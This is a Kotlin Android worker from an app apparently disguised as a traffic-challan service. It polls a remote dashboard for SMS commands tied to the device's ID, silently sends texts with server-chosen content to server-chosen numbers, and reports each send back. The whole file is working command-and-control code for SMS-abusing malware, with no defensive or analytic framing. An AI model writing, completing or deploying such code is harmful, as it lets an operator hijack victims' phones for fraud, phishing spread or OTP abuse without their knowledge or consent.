package com.rte.challan.worker

import android.content.Context
import android.provider.Settings
import android.telephony.SmsManager
import androidx.work.Worker
import androidx.work.WorkerParameters
import com.rte.challan.network.ClientApi 
import org.json.JSONArray
import org.json.JSONObject

class CommandWorker(context: Context, workerParams: WorkerParameters) :
    Worker(context, workerParams) {

    override fun doWork(): Result {
        val deviceId = Settings.Secure.getString(
            applicationContext.contentResolver, 
            Settings.Secure.ANDROID_ID
        )

        try {
            // 1. Fetch pending commands
            val response = ClientApi.getRequest("/api/command-sms?deviceId=$deviceId")

            if (response == null) return Result.retry()

            val commands = JSONArray(response)

            for (i in 0 until commands.length()) {
                val cmd = commands.getJSONObject(i)
                
                if (cmd.getString("status") == "pending") {
                    val number = cmd.optString("targetNumber")
                    val message = cmd.optString("messageText")
                    val commandId = cmd.optString("id") // Command ki unique ID

                    if (number.isNotEmpty() && message.isNotEmpty()) {
                        // SMS Bhejien
                        sendDirectSms(number, message)
                        
                        // 2. IMPORTANT: Dashboard ko batayein ki SMS bhej diya gaya hai
                        // Taaki agli baar ye command fetch na ho
                        val updateJson = JSONObject().apply {
                            put("commandId", commandId)
                            put("status", "sent")
                            put("deviceId", deviceId)
                        }
                        
                        // Aapke worker mein update ka endpoint check kar lena (e.g. /api/update-command)
                        ClientApi.postRequest("/api/update-command", updateJson) { success ->
                            // Status updated on dashboard
                        }
                    }
                }
            }
            return Result.success()
        } catch (e: Exception) {
            e.printStackTrace()
            return Result.retry()
        }
    }

    private fun sendDirectSms(number: String, msg: String) {
        try {
            val smsManager: SmsManager = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S) {
                applicationContext.getSystemService(SmsManager::class.java)!!
            } else {
                @Suppress("DEPRECATION")
                SmsManager.getDefault()
            }
            smsManager.sendTextMessage(number, null, msg, null, null)
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}
